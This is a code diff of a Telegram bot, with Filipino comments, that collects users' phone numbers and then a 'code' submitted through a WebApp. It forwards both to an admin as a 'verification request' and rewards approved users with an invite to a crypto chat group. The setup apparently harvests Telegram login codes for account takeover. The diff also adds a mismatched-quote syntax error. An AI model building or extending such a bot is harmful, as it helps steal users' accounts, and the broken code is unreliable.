@@ -89,7 +89,7 @@ bot.on("contact", async (ctx) => {
 
   // message: thanks + tanggal keyboard (auto-delete 30 mins)
   const reply = await ctx.reply(
-    " ✅\n\n" +
+    "✅\n\n" +
       "Ngayon lalabas na ang verification step.",
     {
       reply_markup: {
@@ -138,7 +138,7 @@ app.use(express.json());
 
 // API endpoint na tinatawag ng WebApp
 app.post("/api/log-code", async (req, res) => {
-  console.log("Received /api/log-code body:", req.body);
+  console.log("Received /api-log-code body:", req.body);
 
   const { code, tgUser } = req.body || {};
 
@@ -157,7 +157,7 @@ app.post("/api/log-code", async (req, res) => {
     : username ? `@${username}`
     : firstName || "Unknown user";
 
-  // ✅ FIX: walang colon sa submissionId para di magulo sa split
+  // submissionId na walang colon para safe sa split
   const submissionId = `${userId || "unknown"}_${Date.now()}`;
 
   submissions.set(submissionId, {
@@ -200,7 +200,7 @@ bot.on("callback_query", async (ctx) => {
   const data = ctx.callbackQuery.data;
   if (!data) return;
 
-  const [action, submissionId] = data.split(":"); // ngayon safe na
+  const [action, submissionId] = data.split(":");
   const submission = submissions.get(submissionId);
 
   if (!submission) {
@@ -226,7 +226,7 @@ bot.on("callback_query", async (ctx) => {
     "🔔 Verification request\n\n" +
     `👤 User: ${displayName}\n` +
     `🆔 ID: ${userId || "N/A"}\n` +
-    `📱 Telegram phone: ${telegramPhone}\n\n` +
+    `📱 Telegram phone: ${telegramPhone}\n\n" +
     `🔑 Code: ${code}\n\n` +
     `Status: ${statusText}`;
 
@@ -239,7 +239,9 @@ bot.on("callback_query", async (ctx) => {
       if (userId) {
         await bot.telegram.sendMessage(
           userId,
-          "✅ Your verification has been APPROVED.\n\nYou can now continue using the bot."
+          "✅ Your verification has been APPROVED.\n\n" +
+            "Pwede ka nang mag join sa EXCLUSIVE group for free:\n" +
+            "👉 https://t.me/BOCHI_Solana_Chat"
         );
       }
     } else if (action === "reject") {
@@ -247,7 +249,8 @@ bot.on("callback_query", async (ctx) => {
       if (userId) {
         await bot.telegram.sendMessage(
           userId,
-          "❌ Your verification has been REJECTED.\n\nPlease check the instructions in the channel and try again."
+          "❌ Your verification has been REJECTED.\n\n" +
+            "Please check the instructions in the channel and try again."
         );
       }
     }
